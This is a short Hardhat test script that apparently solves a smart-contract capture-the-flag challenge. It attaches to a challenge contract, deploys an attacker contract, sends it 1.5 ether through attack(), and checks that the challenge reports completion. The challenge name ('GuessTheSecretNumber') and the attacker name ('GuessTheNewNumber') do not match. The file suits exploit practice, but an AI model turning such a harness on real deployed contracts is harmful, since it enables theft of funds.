import {ethers} from "hardhat";
import {Contract, Signer} from "ethers";
import {expect} from "chai";

let accounts: Signer[];
let attacker: Signer;
let contract: Contract; // challenge contract
let sendValue = ethers.utils.parseEther("1.5");

before(async function () {
    accounts = await ethers.getSigners();
    attacker = accounts[0];
    const factory = await ethers.getContractFactory("GuessTheSecretNumberChallenge", attacker);
    contract = factory.attach(`0xBCD028c62DB9a5641B382Ca55b78e5b29BB67903`);
});

it("solves the challenge", async function () {
    const factory = await ethers.getContractFactory("GuessTheNewNumberAttacker", attacker);
    let attackerContract = await factory.deploy(contract.address);
    let tx = await attackerContract.attack({value: sendValue});
    console.log(tx.hash);
});

after(async function () {
    expect(await contract.isComplete()).to.eq(true);
});